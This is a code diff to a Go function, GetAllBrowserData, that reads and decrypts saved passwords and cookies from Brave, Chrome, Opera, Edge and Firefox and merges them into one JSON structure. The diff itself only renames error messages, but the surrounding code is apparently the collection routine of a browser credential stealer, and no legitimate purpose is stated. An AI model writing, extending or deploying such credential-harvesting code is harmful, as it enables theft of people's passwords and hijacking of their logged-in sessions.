@@ -90,52 +90,52 @@ type DataBlob struct {
 func GetAllBrowserData() (JSONStruct, error) {
 	bravePasswords, err := readChromiumPasswords(BravePasswordPath, BraveKeyPath)
 	if err != nil {
-		return JSONStruct{}, fmt.Errorf("ReadBravePasswords: %v", err)
+		return JSONStruct{}, fmt.Errorf("readBravePasswords: %v", err)
 	}
 
 	braveCookies, err := readChromiumCookies(BraveCookiesPath, BraveKeyPath)
 	if err != nil {
-		return JSONStruct{}, fmt.Errorf("readChromiumCookies: %v", err)
+		return JSONStruct{}, fmt.Errorf("readBraveCookies: %v", err)
 	}
 
 	chromePasswords, err := readChromiumPasswords(ChromePasswordPath, ChromeKeyPath)
 	if err != nil {
-		return JSONStruct{}, fmt.Errorf("ReadChromePasswords: %v", err)
+		return JSONStruct{}, fmt.Errorf("readChromePasswords: %v", err)
 	}
 
 	chromeCookies, err := readChromiumCookies(ChromeCookiesPath, ChromeKeyPath)
 	if err != nil {
-		return JSONStruct{}, fmt.Errorf("readChromiumCookies: %v", err)
+		return JSONStruct{}, fmt.Errorf("readChromeCookies: %v", err)
 	}
 
 	operaPasswords, err := readChromiumPasswords(OperaPasswordPath, OperaKeyPath)
 	if err != nil {
-		return JSONStruct{}, fmt.Errorf("ReadOperaPasswords: %v", err)
+		return JSONStruct{}, fmt.Errorf("readOperaPasswords: %v", err)
 	}
 
 	operaCookies, err := readChromiumCookies(OperaCookiesPath, OperaKeyPath)
 	if err != nil {
-		return JSONStruct{}, fmt.Errorf("readChromiumCookies: %v", err)
+		return JSONStruct{}, fmt.Errorf("readOperaCookies: %v", err)
 	}
 
 	edgePasswords, err := readChromiumPasswords(EdgePasswordPath, EdgeKeyPath)
 	if err != nil {
-		return JSONStruct{}, fmt.Errorf("ReadEdgePasswords: %v", err)
+		return JSONStruct{}, fmt.Errorf("readEdgePasswords: %v", err)
 	}
 
 	edgeCookies, err := readChromiumCookies(EdgeCookiesPath, EdgeKeyPath)
 	if err != nil {
-		return JSONStruct{}, fmt.Errorf("readChromiumCookies: %v", err)
+		return JSONStruct{}, fmt.Errorf("readEdgeCookies: %v", err)
 	}
 
 	firefoxPasswords, err := ReadFirefoxPasswords()
 	if err != nil {
-		return JSONStruct{}, fmt.Errorf("ReadFirefoxPasswords: %v", err)
+		return JSONStruct{}, fmt.Errorf("readFirefoxPasswords: %v", err)
 	}
 
 	firefoxCookies, err := ReadFirefoxCookies()
 	if err != nil {
-		return JSONStruct{}, fmt.Errorf("ReadFirefoxCookies: %v", err)
+		return JSONStruct{}, fmt.Errorf("readFirefoxCookies: %v", err)
 	}
 
 	consolidated := JSONStruct{
